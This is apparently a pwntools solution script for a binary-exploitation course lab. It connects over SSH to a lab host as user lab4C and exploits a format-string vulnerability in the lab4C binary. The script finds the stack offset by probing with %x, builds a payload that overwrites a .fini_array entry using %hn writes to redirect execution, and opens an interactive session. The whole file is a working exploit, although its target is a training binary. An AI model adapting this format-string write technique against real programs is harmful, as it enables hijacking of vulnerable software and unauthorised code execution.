from __future__ import print_function
from pwn import *
import re
import sys

HOST="192.168.13.101"

def find_passwd():
    with open("./sshlab.sh","r") as f:
        for line in f:
            matchObj=re.match(r'.*lab4C:(.*)', line, re.I|re.M)
            if matchObj:
                user="lab4C"
                password = re.sub(r'"',"",str(matchObj.group(1)))
    return (user, password)

def spawn_conn():
    user, password=find_passwd()
    conn=ssh(user=user, password=password, host=HOST)
    p=conn.process("/levels/lab04/lab4C")
    p.recvuntil("Username: ")
    return p

def find_offset():
    for i in xrange(1,40):
        string="Trying offset: \033[1;31m{}\033[0m".format(i)
        sys.stdout.write("%s" % string)
        sys.stdout.write("\033[D"*len(string))
        sys.stdout.flush()
        p=spawn_conn()
        fmt_str="AAAA%{0}$x".format(i)
        p.sendline(fmt_str)
        p.recvuntil("Password: ")
        p.sendline("ABCD")
        answer=p.recvlines(2)[1].strip("AAAA")
        if "41414141" in answer:
            offset = i
            print("\033[1;34mFound offset\033[0m @ \033[1;31m{}\033[0m".format(i))
            break
    return offset


def main():
    global p
    context(os="linux", arch="i386", log_level="ERROR")
    #offset=find_offset()
    offset=37
    jump_to=0x08048aeb
    fini_array=0x08049de4
    first=u16(p32(jump_to)[:2])
    #second=u16(p32(jump_to)[2:])+30000
    print(first)
    #print(second)
    fmt_string=p32(fini_array)+"JUNK"+p32(fini_array+2)+"%{}x".format(first-12)+"%{}$hn".format(offset)+"%{}x".format(32025)+"%{}$hn".format(offset+2)+"\n"+"password"
    print(repr(fmt_string))
    p=spawn_conn()    
    p.sendline(fmt_string)
    p.interactive()

    


if __name__ == '__main__':
    main()